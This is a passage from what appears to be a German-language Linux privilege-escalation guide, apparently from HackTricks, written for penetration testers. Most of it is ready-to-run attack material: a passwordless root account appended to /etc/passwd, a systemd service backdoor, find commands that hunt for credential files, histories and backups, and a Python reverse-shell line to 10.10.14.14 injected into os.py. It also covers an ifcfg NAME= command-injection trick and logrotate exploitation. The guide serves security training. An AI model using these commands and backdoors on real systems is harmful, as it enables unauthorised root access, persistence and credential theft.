z. B.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Du kannst jetzt den Befehl `su` mit `hacker:hacker` verwenden.

Alternativ kannst Du die folgenden Zeilen verwenden, um einen Dummy-User ohne Passwort hinzuzufügen.\
WARNUNG: Dadurch kann die Sicherheit der Maschine beeinträchtigt werden.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
HINWEIS: Auf BSD-Plattformen befindet sich `/etc/passwd` in `/etc/pwd.db` und `/etc/master.passwd`, außerdem wurde `/etc/shadow` in `/etc/spwd.db` umbenannt.

Du solltest prüfen, ob du in einige **sensible Dateien** schreiben kannst. Zum Beispiel, kannst du in eine **Service-Konfigurationsdatei** schreiben?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Zum Beispiel, wenn die Maschine einen **tomcat**-Server ausführt und du **die Tomcat service configuration file inside /etc/systemd/,** ändern kannst, dann kannst du die Zeilen ändern:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Deine backdoor wird beim nächsten Start von tomcat ausgeführt.

### Ordner prüfen

Die folgenden Ordner können Sicherungen oder interessante Informationen enthalten: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Wahrscheinlich kannst du das letzte nicht lesen, aber versuche es.)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Ungewöhnlicher Speicherort/Owned Dateien
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Geänderte Dateien in den letzten Minuten
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB-Dateien
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml Dateien
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Versteckte Dateien
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries im PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web-Dateien**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Sicherungen**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bekannte Dateien, die Passwörter enthalten

Lies den Code von [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), er durchsucht nach **mehreren möglichen Dateien, die Passwörter enthalten könnten**.\
**Ein weiteres interessantes Tool**, das du dafür verwenden kannst, ist: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), eine Open-Source-Anwendung, die dazu dient, viele auf einem lokalen Computer gespeicherte Passwörter für Windows, Linux & Mac wiederherzustellen.

### Logs

Wenn du Logs lesen kannst, findest du möglicherweise **interessante/vertrauliche Informationen darin**. Je seltsamer der Log ist, desto interessanter wird er sein (wahrscheinlich).\
Außerdem können einige "**bad**" konfigurierte (backdoored?) **audit logs** es erlauben, **Passwörter zu protokollieren** innerhalb von audit logs, wie in diesem Beitrag erklärt: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Um **Logs zu lesen ist die Gruppe** [**adm**](interesting-groups-linux-pe/index.html#adm-group) sehr hilfreich.

### Shell-Dateien
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Du solltest auch nach Dateien suchen, die das Wort "**password**" im **Namen** oder im **Inhalt** enthalten, und außerdem nach IPs und E‑Mails in Logs oder nach Hashes per Regex.\
Ich werde hier nicht aufzählen, wie man das alles macht, aber wenn du interessiert bist, kannst du dir die letzten Prüfungen anschauen, die [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) perform.

## Schreibbare Dateien

### Python library hijacking

Wenn du weißt, **von wo** ein python script ausgeführt wird und du in diesen Ordner **schreiben kannst** oder **python libraries modifizieren** kannst, kannst du die OS library ändern und backdoor it (wenn du schreiben kannst, wo das python script ausgeführt wird, kopiere und füge die os.py library ein).

Um die Bibliothek zu backdooren, füge einfach am Ende der os.py library die folgende Zeile hinzu (IP und PORT anpassen):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate-Ausnutzung

Eine Schwachstelle in `logrotate` ermöglicht es Benutzern mit **Schreibrechten** auf eine Log-Datei oder deren übergeordnete Verzeichnisse, potenziell erhöhte Privilegien zu erlangen. Das liegt daran, dass `logrotate`, das oft als **root** läuft, so manipuliert werden kann, dass es beliebige Dateien ausführt, insbesondere in Verzeichnissen wie _**/etc/bash_completion.d/**_. Wichtig ist, die Berechtigungen nicht nur in _/var/log_ zu prüfen, sondern auch in jedem Verzeichnis, in dem Logrotation angewendet wird.

> [!TIP]
> Diese Schwachstelle betrifft `logrotate` Version `3.18.0` und ältere

Detailliertere Informationen über die Schwachstelle finden Sie auf dieser Seite: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Sie können diese Schwachstelle mit [**logrotten**](https://github.com/whotwagner/logrotten) ausnutzen.

Diese Schwachstelle ist sehr ähnlich zu [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** daher sollten Sie, wann immer Sie feststellen, dass Sie Logs ändern können, prüfen, wer diese Logs verwaltet und ob Sie Privilegien eskalieren können, indem Sie die Logs durch Symlinks ersetzen.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referenz zur Schwachstelle:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Wenn aus irgendeinem Grund ein Benutzer in der Lage ist, ein `ifcf-<whatever>`-Skript nach _/etc/sysconfig/network-scripts_ zu **schreiben** oder ein bestehendes anzupassen, dann ist Ihr **System ist pwned**.

Network scripts, _ifcg-eth0_ zum Beispiel, werden für Netzwerkverbindungen verwendet. Sie sehen genau aus wie .INI-Dateien. Allerdings werden sie auf Linux vom Network Manager (dispatcher.d) \~sourced\~.

In meinem Fall wird das Attribut `NAME=` in diesen Network scripts nicht korrekt behandelt. Wenn Sie **Leerzeichen im Namen haben, versucht das System den Teil nach dem Leerzeichen auszuführen**. Das bedeutet, dass **alles nach dem ersten Leerzeichen als root ausgeführt wird**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Hinweis: Das Leerzeichen zwischen Network und /bin/id_)

### **init, init.d, systemd, und rc.d**

Das Verzeichnis `/etc/init.d` beherbergt **scripts** für System V init (SysVinit), das **classic Linux service management system**. Es enthält Skripte zum `start`, `stop`, `restart` und manchmal `reload` von Services. Diese können direkt ausgeführt werden oder über symbolische Links in `/etc/rc?.d/`. Ein alternativer Pfad in Redhat-Systemen ist `/etc/rc.d/init.d`.

Auf der anderen Seite ist `/etc/init` mit **Upstart** verknüpft, einem neueren **service management**, das von Ubuntu eingeführt wurde und Konfigurationsdateien zur Verwaltung von Services nutzt. Trotz der Umstellung auf Upstart werden SysVinit-Skripte weiterhin neben Upstart-Konfigurationen verwendet, da Upstart eine Kompatibilitätsschicht bietet.

**systemd** hat sich als moderner Init- und Service-Manager etabliert und bietet erweiterte Funktionen wie bedarfsorientiertes Starten von Daemons, automount-Verwaltung und Systemzustandssnapshots. Es organisiert Dateien in `/usr/lib/systemd/` für Distributionspakete und `/etc/systemd/system/` für Administratoränderungen, was die Systemverwaltung vereinfacht.

## Weitere Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks hooken häufig einen syscall, um privilegierte Kernel-Funktionalität an einen userspace manager zu exponieren. Schwache Manager-Authentifizierung (z. B. signature checks basierend auf FD-order oder schlechte Passwortschemata) kann einer lokalen App erlauben, den Manager zu imitieren und auf bereits gerooteten Geräten zu rooten. Mehr Informationen und Exploit-Details hier:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Mehr Hilfe

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
